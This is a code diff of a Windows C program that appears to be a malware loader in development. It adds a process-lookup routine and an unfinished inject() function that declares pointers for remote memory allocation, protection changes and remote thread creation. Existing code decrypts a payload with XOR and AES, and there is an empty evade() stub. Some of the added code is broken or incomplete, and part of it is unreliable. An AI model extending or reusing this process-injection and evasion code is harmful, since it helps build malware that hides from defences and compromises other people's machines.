@@ -6,6 +6,42 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
+#include <tlhelp32.h>
+
+int FindTarget(const char * procname){
+	HANDLE hProcSnap;
+	PROCESSENTRY32 pe32;
+	int pid = 0;
+
+	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(hProcSnap, &pe32)){
+		CloseHandle(hProcSnap);
+		return 0;
+	}
+
+	while (Process32Next(hProcSnap, &pe32)){
+		if (lstrcmpiA(procname, pe32.szExeFile)== 0){
+			pid = pe32.th32ParentProcessID;
+			break;
+		}
+	}
+
+	CloseHandle(hProcSnap);
+	return pid;
+}
+
+int inject(){
+	LPVOID (WINAPI * pAllocex) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD flProtect);
+	BOOL (WINAPI * pProtect) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, DWORD lpflOldProtect);
+	 (WINAPI * pWPM) ();
+	HANDLE (WINAPI * pthreadA)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+	DWORD (WINAPI * pwFSO)(HANDLE hHandle, DWORD dwMilliseconds);
+}
+
 
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
     for (size_t i = 0, j = 0; i < data_len; i++, j++) {
@@ -40,12 +76,8 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
         return 0;
 }
 
-LPVOID (WINAPI * pAlloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD flProtect);
-BOOL (WINAPI * pProtect) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, DWORD lpflOldProtect);
-void (WINAPI * pmvMe) (void *Destination, const void *Source, size_t Length);
-HANDLE (WINAPI * pthreadA)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-DWORD (WINAPI * pwFSO)(HANDLE hHandle, DWORD dwMilliseconds);
-LPVOID (WINAPI * enNuma) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nnDPreferred);
+
+
 
 void evade(){
 	// todo
